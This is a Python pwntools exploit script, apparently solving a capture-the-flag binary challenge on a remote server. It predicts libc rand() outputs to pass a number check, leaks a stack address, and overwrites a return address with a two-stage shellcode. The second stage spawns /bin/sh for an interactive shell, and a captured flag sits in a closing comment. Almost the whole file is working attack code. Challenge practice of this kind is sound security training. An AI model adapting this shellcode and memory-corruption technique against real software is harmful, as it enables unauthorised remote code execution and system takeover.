#!/usr/bin/env python
from pwn import *
import ctypes

#r = remote('127.0.0.1', 4000)
r = remote('35.201.132.60', 12001)
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(0)

context.arch = 'amd64'

r.recvuntil('please input your numbers:')
for i in range(15):
    val = LIBC.rand() % 200
    r.sendline(str(val))
    log.success('send {}'.format(val))
r.send('199\x90')

# leak stack address
r.recvuntil('199\x90')
stack_addr = u64(r.recvn(6).ljust(8, '\x00'))
log.success('stack address: ' + hex(stack_addr))

# read sc2 to stack
sc1 = asm("""
    mov rdx, r11
    sub rsi, 6
    syscall
""")

payload = flat(
    sc1.ljust(12, '\x90'),
    p64(stack_addr-0x14)[:7]
)

r.sendafter('Winner can leave message for others:', payload)

sc2 = asm("""
    mov rax, 59
    mov r8, 0x0068732f6e69622f
    push r8
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
""")

r.send(sc2)

r.interactive()

# FLAG{THIS_challenge_is_too_easy_QQ}
